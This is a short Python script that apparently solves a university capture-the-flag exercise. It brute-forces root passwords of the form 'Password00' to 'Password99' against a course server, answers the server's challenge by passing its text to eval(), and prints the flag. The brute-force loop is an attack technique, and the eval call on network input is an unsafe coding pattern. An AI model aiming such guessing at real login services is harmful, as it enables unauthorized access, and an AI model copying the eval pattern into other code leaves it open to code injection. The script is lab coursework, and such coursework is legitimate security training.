import socket
import concurrent.futures
import ast

# Fill in the right target here
HOST = 'netsec.net.in.tum.de'
PORT = 64984

def password_gen():
    return (map(lambda n: 'Password' + str(n).zfill(2), range(0,100)))


def get_flag():
    try_password()

# return p if correct
def try_password():

    line = ""
    for i in range(0, 1000):
        i %= 100
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
        sf = s.makefile('rw')  # we use a file abstraction for the sockets
        
        sf.write('root,Password' + str(i).zfill(2) + '\n'); # enter password
        sf.flush()
        line = sf.readline().strip(); # read result
        #print("challenge text:",line)
        line = sf.readline().strip()
        #print("to eval:", line)
        result = str(eval(line))
        #print("result:", result)
        sf.write(result + '\n')
        sf.flush()
        line = sf.readline()
        #print("connection:", line)
    


        if not line.startswith("Invalid"):
            print(sf.readline())     
            sf.close()
            s.close()
            break
        sf.close()
        s.close()

if __name__ == '__main__':
    get_flag()




